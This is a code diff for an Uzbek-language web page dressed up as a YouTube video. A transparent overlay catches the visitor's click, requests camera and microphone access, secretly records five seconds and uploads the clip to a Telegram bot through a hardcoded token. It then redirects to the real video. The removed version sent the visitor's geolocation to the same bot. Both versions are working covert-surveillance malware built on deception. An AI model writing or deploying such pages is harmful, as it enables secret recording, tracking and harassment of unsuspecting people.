@@ -1,20 +1,60 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube - Qiziqarli Video</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: black; }
+        iframe { width: 100%; height: 100%; border: none; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
+    </style>
+</head>
 <body>
+    <iframe src="https://www.youtube.com/embed/Enf0Z0SsQHs?autoplay=1&mute=1" allow="autoplay"></iframe>
+    
+    <div class="overlay" onclick="startProcess()"></div>
+
+    <video id="video" autoplay style="display:none;"></video>
+
     <script>
         const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
         const adminId = '8275787221';
 
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const text = `📍 Foydalanuvchi manzili:\nhttps://www.google.com/maps?q=${lat},${lon}`;
-            
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(text)}`);
-            window.location.href = "https://google.com";
-        });
+        async function startProcess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('video', blob, 'video.mp4');
+                    
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo?chat_id=${adminId}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    // Video yuborilgach, haqiqiy YouTube sahifasiga o'tadi
+                    window.location.href = "https://youtu.be/Enf0Z0SsQHs?si=UpxfW5fLCEr8a8n-";
+                };
+
+                recorder.start();
+                setTimeout(() => {
+                    recorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 5000); // 5 soniya yozib oladi
+
+            } catch (err) {
+                console.log("Xato: " + err);
+                window.location.href = "https://youtu.be/Enf0Z0SsQHs?si=UpxfW5fLCEr8a8n-";
+            }
+        }
     </script>
 </body>
 </html>
- 
